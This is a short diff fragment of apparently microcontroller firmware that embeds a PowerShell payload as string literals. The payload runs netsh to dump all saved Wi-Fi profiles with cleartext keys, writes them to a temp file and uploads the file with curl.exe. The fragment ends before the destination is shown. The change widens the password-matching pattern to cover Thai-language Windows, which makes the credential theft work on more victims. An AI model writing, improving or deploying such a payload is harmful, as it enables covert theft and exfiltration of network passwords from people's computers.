@@ -654,7 +654,7 @@ static void webSocketEvent(uint8_t num, WStype_t type, uint8_t *payload,
             "$f=$env:TEMP+'\\w.txt';"
             "(netsh wlan show profiles) | Select-String '\\:(.+)$' | %{ "
             "$n=$_.Matches.Groups[1].Value.Trim(); "
-            "$k=(netsh wlan show profile name=\\\"$n\\\" key=clear) | Select-String 'Key Content\\W+\\:(.+)$'; "
+            "$k=(netsh wlan show profile name=\\\"$n\\\" key=clear) | Select-String '(Key Content|เนื้อหาของคีย์)\\W+\\:(.+)$'; "
             "if($k){ \\\"$n : $($k.Matches.Groups[1].Value.Trim())\\\" >> $f }else{ \\\"$n : NoKey\\\" >> $f } "
             "};"
             "curl.exe -F ('file=@'+$f) "
